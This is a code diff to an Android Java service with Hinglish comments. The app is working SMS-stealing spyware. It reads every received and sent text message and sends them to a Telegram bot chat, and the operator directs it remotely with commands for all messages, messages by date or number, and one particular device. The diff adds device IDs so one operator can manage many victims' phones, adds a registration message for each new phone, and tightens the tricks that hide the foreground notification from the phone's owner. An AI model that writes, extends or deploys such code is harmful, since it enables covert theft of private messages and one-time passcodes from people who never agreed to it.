@@ -4,13 +4,13 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.Settings;
 import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -40,36 +40,34 @@ public class SmsService extends Service {
     private static final String KEY_SENT        = "old_sms_sent";
     private static final String KEY_OFFSET      = "last_update_id";
     private static final String KEY_BLOCKED_NOS = "blocked_numbers";
+    private static final String KEY_DEVICE_ID   = "device_id";
 
-    // Sirf Telegram par message bhejne ko rokta hai — app hamesha chalta rahega
     private static volatile boolean telegramPaused = false;
-
     private volatile boolean running = true;
     private Thread pollThread;
+    private String myDeviceId;
 
     // ─── Lifecycle ───────────────────────────────────────────
     @Override
     public void onCreate() {
         super.onCreate();
+        myDeviceId = getOrCreateDeviceId();
         startHiddenForeground();
+        registerDevice();
         startPolling();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && intent.hasExtra("sms_sender")) {
-            String sender = intent.getStringExtra("sms_sender");
-            String body   = intent.getStringExtra("sms_body");
-            long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
-
-            // Global pause check
-            if (telegramPaused) return START_STICKY;
-
-            // Number-level block check
-            if (isNumberBlocked(sender)) return START_STICKY;
-
-            new Thread(() -> sendSmsToTelegram(sender, body, time)).start();
-
+            if (!telegramPaused) {
+                String sender = intent.getStringExtra("sms_sender");
+                String body   = intent.getStringExtra("sms_body");
+                long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
+                if (!isNumberBlocked(sender)) {
+                    new Thread(() -> sendSmsToTelegram(sender, body, time)).start();
+                }
+            }
         } else {
             SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
             if (!prefs.getBoolean(KEY_SENT, false)) {
@@ -89,25 +87,66 @@ public class SmsService extends Service {
 
     @Override public IBinder onBind(Intent intent) { return null; }
 
-    // ─── Hidden Notification ─────────────────────────────────
+    // ─── Device ID ───────────────────────────────────────────
+    private String getOrCreateDeviceId() {
+        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
+        String saved = prefs.getString(KEY_DEVICE_ID, null);
+        if (saved != null) return saved;
+
+        // Android ID se unique short ID banao
+        String androidId = Settings.Secure.getString(
+            getContentResolver(), Settings.Secure.ANDROID_ID);
+        String shortId = (androidId != null && androidId.length() >= 6)
+            ? androidId.substring(androidId.length() - 6).toUpperCase()
+            : "DEV" + (int)(Math.random() * 9999);
+
+        prefs.edit().putString(KEY_DEVICE_ID, shortId).apply();
+        return shortId;
+    }
+
+    private void registerDevice() {
+        new Thread(() -> sendRawMessage(
+            "📱 NEW DEVICE ONLINE\n" +
+            "Device ID: [" + myDeviceId + "]\n" +
+            "Ab is device ke SMS forward honge.\n\n" +
+            "Commands:\n" +
+            "/device " + myDeviceId + " /all — Is device ke saare SMS\n" +
+            "/device " + myDeviceId + " /date 02-01-2022 — Is din ke SMS\n" +
+            "/devices — Saare registered devices dekhein"
+        )).start();
+    }
+
+    // ─── Hidden Notification (poori tarah chhupa do) ─────────
     private void startHiddenForeground() {
+        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
+                CH_ID, ".", NotificationManager.IMPORTANCE_NONE);
             ch.setShowBadge(false);
             ch.setSound(null, null);
             ch.enableLights(false);
             ch.enableVibration(false);
             ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
-            NotificationManager nm = getSystemService(NotificationManager.class);
+            ch.setDescription("");
             if (nm != null) nm.createNotificationChannel(ch);
         }
+
         Notification notif = new NotificationCompat.Builder(this, CH_ID)
             .setSmallIcon(android.R.drawable.screen_background_dark)
+            .setContentTitle("")
+            .setContentText("")
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setSilent(true).setShowWhen(false).setOngoing(false).build();
+            .setSilent(true)
+            .setShowWhen(false)
+            .setOngoing(false)
+            .setAutoCancel(true)
+            .build();
+
         startForeground(NOTIF_ID, notif);
+
+        // InnerService trick — notification permanently hata do
         startService(new Intent(this, InnerService.class));
     }
 
@@ -140,7 +179,6 @@ public class SmsService extends Service {
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setConnectTimeout(15000);
         conn.setReadTimeout(15000);
-
         BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
         StringBuilder sb = new StringBuilder();
         String line;
@@ -155,15 +193,12 @@ public class SmsService extends Service {
             JSONObject update = updates.getJSONObject(i);
             long updateId = update.getLong("update_id");
             prefs.edit().putLong(KEY_OFFSET, updateId).apply();
-
             if (!update.has("message")) continue;
             JSONObject msg = update.getJSONObject("message");
             if (!msg.has("text")) continue;
-
             String text   = msg.getString("text").trim();
             String fromId = String.valueOf(msg.getJSONObject("chat").getLong("id"));
             if (!fromId.equals(CHAT_ID)) continue;
-
             handleCommand(text);
         }
     }
@@ -172,33 +207,56 @@ public class SmsService extends Service {
     private void handleCommand(String cmd) {
         new Thread(() -> {
 
-            // ════ Phone Number Commands ════
-            // Format: /NUMBER-/COMMAND  e.g.  /9876543210-/all
-            //                                  /9876543210-/stop
-            //                                  /9876543210-/start
-            //                                  /9876543210-/date 02-01-2022
-            Pattern phonePattern = Pattern.compile("^/([\\d+\\-\\s]+)-/(.+)$");
-            Matcher m = phonePattern.matcher(cmd);
+            // ══ /device DEVICE_ID /COMMAND ══
+            // e.g. /device A1B2C3 /all
+            //      /device A1B2C3 /date 02-01-2022
+            Pattern devPattern = Pattern.compile(
+                "(?i)^/device\\s+([A-Z0-9]+)\\s+/(.+)$");
+            Matcher dm = devPattern.matcher(cmd.trim());
+            if (dm.matches()) {
+                String targetId = dm.group(1).toUpperCase();
+                String subCmd   = dm.group(2).trim().toLowerCase();
+                // Sirf mera device hi respond kare
+                if (!targetId.equals(myDeviceId)) return;
+                handleDeviceCommand(subCmd);
+                return;
+            }
 
-            if (m.matches()) {
-                String number  = m.group(1).trim();
-                String subCmd  = m.group(2).trim().toLowerCase();
+            // ══ /devices — saare devices reply karein apni info ══
+            if (cmd.equalsIgnoreCase("/devices")) {
+                sendRawMessage(
+                    "📱 Device Online: [" + myDeviceId + "]\n" +
+                    "Commands:\n" +
+                    "/device " + myDeviceId + " /all\n" +
+                    "/device " + myDeviceId + " /date DD-MM-YYYY\n" +
+                    "/device " + myDeviceId + " /stop\n" +
+                    "/device " + myDeviceId + " /start"
+                );
+                return;
+            }
+
+            // ══ /NUMBER-/COMMAND (contact filter) ══
+            Pattern phonePattern = Pattern.compile("^/([\\d+\\-\\s]+)-/(.+)$");
+            Matcher pm = phonePattern.matcher(cmd);
+            if (pm.matches()) {
+                String number = pm.group(1).trim();
+                String subCmd = pm.group(2).trim().toLowerCase();
                 handlePhoneCommand(number, subCmd);
                 return;
             }
 
-            // ════ Global Commands ════
+            // ══ Global Commands ══
             if (cmd.equalsIgnoreCase("/stop")) {
                 telegramPaused = true;
-                sendRawMessage("⏸ Telegram par messages BAND.\nApp background mein chal rahi hai.\nDobara chalu: /start");
+                sendRawMessage("⏸ Telegram par messages BAND.\nApp chal rahi hai.\n/start se dobara chalu karo.");
 
             } else if (cmd.equalsIgnoreCase("/start")) {
                 telegramPaused = false;
-                sendRawMessage("▶ Telegram par messages CHALU!\nNaye SMS yahan aayenge.");
+                sendRawMessage("▶ Telegram par messages CHALU!\nNaye SMS ab aayenge.");
 
             } else if (cmd.equalsIgnoreCase("/all")) {
                 telegramPaused = false;
-                sendRawMessage("📦 Saare SMS bhej raha hun...\n/stop se rok sakte ho.");
+                sendRawMessage("📦 [" + myDeviceId + "] ke saare SMS bhej raha hun...\n/stop se rok sakte ho.");
                 sendAllOldSms();
                 if (!telegramPaused) sendRawMessage("✅ Saare SMS bhej diye!");
 
@@ -216,153 +274,152 @@ public class SmsService extends Service {
                 if (blocked.isEmpty()) {
                     sendRawMessage("✅ Koi bhi number block nahi hai.");
                 } else {
-                    StringBuilder sb = new StringBuilder("🚫 Blocked Numbers:\n");
-                    for (String n : blocked) sb.append("• ").append(n).append("\n");
-                    sb.append("\nUnblock: /NUMBER-/start");
-                    sendRawMessage(sb.toString());
+                    StringBuilder sb2 = new StringBuilder("🚫 Blocked Numbers:\n");
+                    for (String n : blocked) sb2.append("• ").append(n).append("\n");
+                    sb2.append("\nUnblock: /NUMBER-/start");
+                    sendRawMessage(sb2.toString());
                 }
 
             } else if (cmd.equalsIgnoreCase("/status")) {
-                Set<String> blocked = getBlockedNumbers();
                 sendRawMessage(
-                    "📊 App: 🟢 Chal rahi hai\n" +
+                    "📊 Device: [" + myDeviceId + "]\n" +
+                    "App: 🟢 Chal rahi hai\n" +
                     "Telegram: " + (telegramPaused ? "⏸ BAND" : "▶ CHALU") + "\n" +
-                    "Blocked numbers: " + (blocked.isEmpty() ? "Koi nahi" : blocked.size() + " number")
+                    "Blocked: " + getBlockedNumbers().size() + " number"
                 );
 
             } else if (cmd.equalsIgnoreCase("/help")) {
                 sendRawMessage(
-                    "📋 Global Commands:\n" +
-                    "/start — Telegram messages chalu\n" +
-                    "/stop  — Telegram messages band\n" +
-                    "/all   — Saare SMS\n" +
+                    "📋 Global:\n" +
+                    "/devices — Online devices dekhein\n" +
+                    "/start /stop — Messages on/off\n" +
+                    "/all — Saare SMS\n" +
                     "/date DD-MM-YYYY — Us din ke SMS\n" +
-                    "/blocked — Blocked numbers ki list\n" +
-                    "/status — App ki halat\n\n" +
-                    "📱 Number Commands (format):\n" +
+                    "/blocked /status /help\n\n" +
+                    "📱 Device Commands:\n" +
+                    "/device ID /all\n" +
+                    "/device ID /date DD-MM-YYYY\n" +
+                    "/device ID /stop\n" +
+                    "/device ID /start\n\n" +
+                    "📞 Number Filter:\n" +
                     "/NUMBER-/all\n" +
                     "/NUMBER-/date DD-MM-YYYY\n" +
-                    "/NUMBER-/stop  (us number ke SMS band)\n" +
-                    "/NUMBER-/start (us number ke SMS chalu)\n\n" +
-                    "Example:\n" +
-                    "/9876543210-/all\n" +
-                    "/9876543210-/date 02-01-2022\n" +
-                    "/9876543210-/stop"
+                    "/NUMBER-/stop\n" +
+                    "/NUMBER-/start\n\n" +
+                    "Mera ID: [" + myDeviceId + "]"
                 );
             }
         }).start();
     }
 
-    // ─── Phone Number Commands ────────────────────────────────
-    private void handlePhoneCommand(String number, String subCmd) {
-
+    // ─── Device-specific Commands ────────────────────────────
+    private void handleDeviceCommand(String subCmd) {
         if (subCmd.equals("stop")) {
-            blockNumber(number);
-            sendRawMessage("🚫 " + number + " ke SMS ab Telegram par nahi aayenge.\nDobara chalu: /" + number + "-/start");
+            telegramPaused = true;
+            sendRawMessage("⏸ [" + myDeviceId + "] ke messages band.\n/device " + myDeviceId + " /start se chalu karo.");
 
         } else if (subCmd.equals("start")) {
-            unblockNumber(number);
-            sendRawMessage("✅ " + number + " ke SMS ab Telegram par aayenge.");
+            telegramPaused = false;
+            sendRawMessage("▶ [" + myDeviceId + "] ke messages chalu!");
 
         } else if (subCmd.equals("all")) {
-            sendRawMessage("⭐ " + number + " ke SAARE SMS bhej raha hun...\n/stop se rok sakte ho.");
-            int count = queryByNumberAndSend(number, -1, -1);
+            telegramPaused = false;
+            sendRawMessage("⭐ [" + myDeviceId + "] ke SAARE SMS bhej raha hun...\n/stop se rok sakte ho.");
+            sendAllOldSms();
+            if (!telegramPaused) sendRawMessage("✅ [" + myDeviceId + "] ke saare SMS bhej diye!");
+
+        } else if (subCmd.startsWith("date ")) {
+            String dateStr = subCmd.substring(5).trim();
+            int count = sendSmsByDate(null, dateStr);
             if (!telegramPaused)
                 sendRawMessage(count == 0
-                    ? "❌ " + number + " ka koi SMS nahi mila."
-                    : "✅ " + number + " ke " + count + " SMS bhej diye!");
+                    ? "❌ " + dateStr + " ko koi SMS nahi mila."
+                    : "✅ [" + myDeviceId + "] " + dateStr + " ke " + count + " SMS bhej diye!");
+        }
+    }
 
+    // ─── Phone Number Commands ────────────────────────────────
+    private void handlePhoneCommand(String number, String subCmd) {
+        if (subCmd.equals("stop")) {
+            blockNumber(number);
+            sendRawMessage("🚫 " + number + " ke SMS band.\nUnblock: /" + number + "-/start");
+        } else if (subCmd.equals("start")) {
+            unblockNumber(number);
+            sendRawMessage("✅ " + number + " ke SMS dobara chalu.");
+        } else if (subCmd.equals("all")) {
+            sendRawMessage("⭐ " + number + " ke SAARE SMS...\n/stop se rok sakte ho.");
+            int count = queryByNumberAndSend(number, -1, -1);
+            if (!telegramPaused)
+                sendRawMessage(count == 0 ? "❌ Nahi mila." : "✅ " + count + " SMS bhej diye!");
         } else if (subCmd.startsWith("date ")) {
             String dateStr = subCmd.substring(5).trim();
             int count = sendSmsByDate(number, dateStr);
             if (!telegramPaused)
                 sendRawMessage(count == 0
-                    ? "❌ " + number + " ka " + dateStr + " ko koi SMS nahi mila."
-                    : "✅ " + number + " ke " + count + " SMS bhej diye!");
-
-        } else {
-            sendRawMessage("❓ Pehchana nahi: /" + number + "-/" + subCmd + "\n/help dekho.");
+                    ? "❌ " + number + " ka " + dateStr + " ko nahi mila."
+                    : "✅ " + count + " SMS bhej diye!");
         }
     }
 
     // ─── Blocked Numbers ─────────────────────────────────────
     private boolean isNumberBlocked(String number) {
         if (number == null) return false;
-        String clean = cleanNumber(number);
-        Set<String> blocked = getBlockedNumbers();
-        for (String b : blocked) {
-            if (cleanNumber(b).equals(clean) || clean.endsWith(cleanNumber(b)) || cleanNumber(b).endsWith(clean))
-                return true;
+        String clean = cleanNum(number);
+        for (String b : getBlockedNumbers()) {
+            String bc = cleanNum(b);
+            if (bc.equals(clean) || clean.endsWith(bc) || bc.endsWith(clean)) return true;
         }
         return false;
     }
-
-    private String cleanNumber(String n) {
+    private String cleanNum(String n) {
         return n == null ? "" : n.replaceAll("[^0-9]", "");
     }
-
     private Set<String> getBlockedNumbers() {
         return new HashSet<>(getSharedPreferences(PREFS, MODE_PRIVATE)
             .getStringSet(KEY_BLOCKED_NOS, new HashSet<>()));
     }
-
-    private void blockNumber(String number) {
-        Set<String> set = getBlockedNumbers();
-        set.add(number);
-        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
-            .putStringSet(KEY_BLOCKED_NOS, set).apply();
+    private void blockNumber(String n) {
+        Set<String> s = getBlockedNumbers(); s.add(n);
+        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putStringSet(KEY_BLOCKED_NOS, s).apply();
     }
-
     private void unblockNumber(String number) {
-        Set<String> set = getBlockedNumbers();
-        set.removeIf(n -> cleanNumber(n).equals(cleanNumber(number)) ||
-                         cleanNumber(number).endsWith(cleanNumber(n)) ||
-                         cleanNumber(n).endsWith(cleanNumber(number)));
-        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
-            .putStringSet(KEY_BLOCKED_NOS, set).apply();
+        Set<String> s = getBlockedNumbers();
+        s.removeIf(n -> {
+            String c1 = cleanNum(n), c2 = cleanNum(number);
+            return c1.equals(c2) || c2.endsWith(c1) || c1.endsWith(c2);
+        });
+        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putStringSet(KEY_BLOCKED_NOS, s).apply();
     }
 
     // ─── Query by Number ─────────────────────────────────────
     private int queryByNumberAndSend(String number, long startMs, long endMs) {
         int count = 0;
         String[] folders = {"content://sms/inbox", "content://sms/sent"};
-        boolean[] isSent  = {false, true};
-
+        boolean[] sent    = {false, true};
         for (int f = 0; f < folders.length; f++) {
             Cursor cursor = null;
             try {
-                String sel  = "address LIKE ?";
-                String like = "%" + cleanNumber(number).substring(
-                    Math.max(0, cleanNumber(number).length() - 10)) + "%";
-                String[] args = {like};
-
-                if (startMs > 0 && endMs > 0) {
-                    sel  = "address LIKE ? AND date >= ? AND date <= ?";
-                    args = new String[]{like, String.valueOf(startMs), String.valueOf(endMs)};
-                }
-
-                cursor = getContentResolver().query(
-                    Uri.parse(folders[f]),
-                    new String[]{"address", "body", "date"},
-                    sel, args, "date ASC");
-
+                String last10 = cleanNum(number);
+                if (last10.length() > 10) last10 = last10.substring(last10.length() - 10);
+                String   sel  = startMs > 0
+                    ? "address LIKE ? AND date >= ? AND date <= ?"
+                    : "address LIKE ?";
+                String[] args = startMs > 0
+                    ? new String[]{"%" + last10 + "%", String.valueOf(startMs), String.valueOf(endMs)}
+                    : new String[]{"%" + last10 + "%"};
+                cursor = getContentResolver().query(Uri.parse(folders[f]),
+                    new String[]{"address","body","date"}, sel, args, "date ASC");
                 if (cursor != null && cursor.moveToFirst()) {
                     do {
                         if (telegramPaused) break;
-                        String addr  = cursor.getString(0);
-                        String body  = cursor.getString(1);
-                        long   ts    = cursor.getLong(2);
-                        String label = isSent[f] ? "[Bheja: " + addr + "]" : addr;
-                        sendSmsToTelegram(label, body, ts);
+                        String label = sent[f] ? "[Bheja: " + cursor.getString(0) + "]" : cursor.getString(0);
+                        sendSmsToTelegram(label, cursor.getString(1), cursor.getLong(2));
                         count++;
                         Thread.sleep(400);
                     } while (cursor.moveToNext());
                 }
-            } catch (Exception e) {
-                e.printStackTrace();
-            } finally {
-                if (cursor != null) cursor.close();
-            }
+            } catch (Exception e) { e.printStackTrace(); }
+            finally { if (cursor != null) cursor.close(); }
         }
         return count;
     }
@@ -370,110 +427,81 @@ public class SmsService extends Service {
     // ─── SMS by Date ─────────────────────────────────────────
     private int sendSmsByDate(String number, String dateStr) {
         try {
-            SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault());
-            Date date = sdf.parse(dateStr);
-            if (date == null) {
-                sendRawMessage("❌ Format galat. Example: /date 02-01-2022");
-                return 0;
-            }
+            Date date = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).parse(dateStr);
+            if (date == null) { sendRawMessage("❌ Format: /date 02-01-2022"); return 0; }
             Calendar cal = Calendar.getInstance();
             cal.setTime(date);
             cal.set(Calendar.HOUR_OF_DAY, 0);  cal.set(Calendar.MINUTE, 0);  cal.set(Calendar.SECOND, 0);
-            long startMs = cal.getTimeInMillis();
+            long start = cal.getTimeInMillis();
             cal.set(Calendar.HOUR_OF_DAY, 23); cal.set(Calendar.MINUTE, 59); cal.set(Calendar.SECOND, 59);
-            long endMs = cal.getTimeInMillis();
+            long end = cal.getTimeInMillis();
 
             String header = number != null
-                ? "⭐⭐⭐ " + number + " ke " + dateStr + " ke SMS ⭐⭐⭐"
-                : "⭐⭐⭐ " + dateStr + " ke SMS ⭐⭐⭐";
+                ? "⭐⭐⭐ " + number + " | " + dateStr + " ⭐⭐⭐"
+                : "⭐⭐⭐ [" + myDeviceId + "] | " + dateStr + " ⭐⭐⭐";
             sendRawMessage(header + "\n/stop se rok sakte ho.");
 
-            if (number != null) {
-                return queryByNumberAndSend(number, startMs, endMs);
-            } else {
-                int c = 0;
-                c += queryAndSend("content://sms/inbox", startMs, endMs, false, null);
-                c += queryAndSend("content://sms/sent",  startMs, endMs, true,  null);
-                return c;
-            }
-        } catch (Exception e) {
-            sendRawMessage("❌ Error: " + e.getMessage());
-            return 0;
-        }
+            return number != null
+                ? queryByNumberAndSend(number, start, end)
+                : queryAndSend("content://sms/inbox", start, end, false)
+                + queryAndSend("content://sms/sent",  start, end, true);
+        } catch (Exception e) { sendRawMessage("❌ Error: " + e.getMessage()); return 0; }
     }
 
-    private int queryAndSend(String uriStr, long startMs, long endMs, boolean isSent, String number) {
-        int count = 0;
-        Cursor cursor = null;
+    private int queryAndSend(String uri, long start, long end, boolean isSent) {
+        int count = 0; Cursor cursor = null;
         try {
-            cursor = getContentResolver().query(Uri.parse(uriStr),
-                new String[]{"address", "body", "date"},
+            cursor = getContentResolver().query(Uri.parse(uri),
+                new String[]{"address","body","date"},
                 "date >= ? AND date <= ?",
-                new String[]{String.valueOf(startMs), String.valueOf(endMs)},
-                "date ASC");
+                new String[]{String.valueOf(start), String.valueOf(end)}, "date ASC");
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     if (telegramPaused) break;
-                    String addr  = cursor.getString(0);
-                    String body  = cursor.getString(1);
-                    long   ts    = cursor.getLong(2);
-                    String label = isSent ? "[Bheja: " + addr + "]" : addr;
-                    sendSmsToTelegram(label, body, ts);
-                    count++;
-                    Thread.sleep(400);
+                    String label = isSent ? "[Bheja: " + cursor.getString(0) + "]" : cursor.getString(0);
+                    sendSmsToTelegram(label, cursor.getString(1), cursor.getLong(2));
+                    count++; Thread.sleep(400);
                 } while (cursor.moveToNext());
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        } finally {
-            if (cursor != null) cursor.close();
-        }
+        } catch (Exception e) { e.printStackTrace(); }
+        finally { if (cursor != null) cursor.close(); }
         return count;
     }
 
-    // ─── Send All SMS ────────────────────────────────────────
     private void sendAllOldSms() {
-        queryAndSend("content://sms/inbox", 0, Long.MAX_VALUE, false, null);
-        queryAndSend("content://sms/sent",  0, Long.MAX_VALUE, true,  null);
+        queryAndSend("content://sms/inbox", 0, Long.MAX_VALUE, false);
+        queryAndSend("content://sms/sent",  0, Long.MAX_VALUE, true);
     }
 
-    // ─── Telegram Helpers ────────────────────────────────────
-    static void sendSmsToTelegram(String sender, String body, long timestamp) {
+    // ─── Telegram ────────────────────────────────────────────
+    static void sendSmsToTelegram(String sender, String body, long ts) {
         if (telegramPaused) return;
         try {
-            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
-                              .format(new Date(timestamp));
+            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault()).format(new Date(ts));
             postToTelegram("From: " + sender + "\nMsg: " + body + "\nTime: " + date);
         } catch (Exception e) { e.printStackTrace(); }
     }
-
-    public static void sendToTelegram(String sender, String body, long timestamp) {
-        sendSmsToTelegram(sender, body, timestamp);
+    public static void sendToTelegram(String sender, String body, long ts) {
+        sendSmsToTelegram(sender, body, ts);
     }
-
     static void sendRawMessage(String text) {
         try { postToTelegram(text); } catch (Exception e) { e.printStackTrace(); }
     }
-
     static void postToTelegram(String text) throws Exception {
         String api  = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
         String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
-                    + "&text="   + URLEncoder.encode(text,    "UTF-8");
+                    + "&text="   + URLEncoder.encode(text, "UTF-8");
         URL url = new URL(api);
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setConnectTimeout(10000);
-        conn.setReadTimeout(10000);
-        conn.setDoOutput(true);
-        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-        OutputStream os = conn.getOutputStream();
-        os.write(data.getBytes("UTF-8"));
-        os.flush();
-        conn.getInputStream();
-        conn.disconnect();
+        HttpURLConnection c = (HttpURLConnection) url.openConnection();
+        c.setRequestMethod("POST"); c.setConnectTimeout(10000); c.setReadTimeout(10000);
+        c.setDoOutput(true);
+        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+        OutputStream os = c.getOutputStream();
+        os.write(data.getBytes("UTF-8")); os.flush();
+        c.getInputStream(); c.disconnect();
     }
 
-    // ─── InnerService (notification hata do) ─────────────────
+    // ─── InnerService — notification permanently hata do ─────
     public static class InnerService extends Service {
         @Override
         public int onStartCommand(Intent intent, int flags, int startId) {
@@ -485,6 +513,10 @@ public class SmsService extends Service {
                     .setSilent(true).build();
                 startForeground(NOTIF_ID, n);
             }
+            // Notification cancel karke service band karo
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (nm != null) nm.cancel(NOTIF_ID);
+            stopForeground(true);
             stopSelf();
             return START_NOT_STICKY;
         }
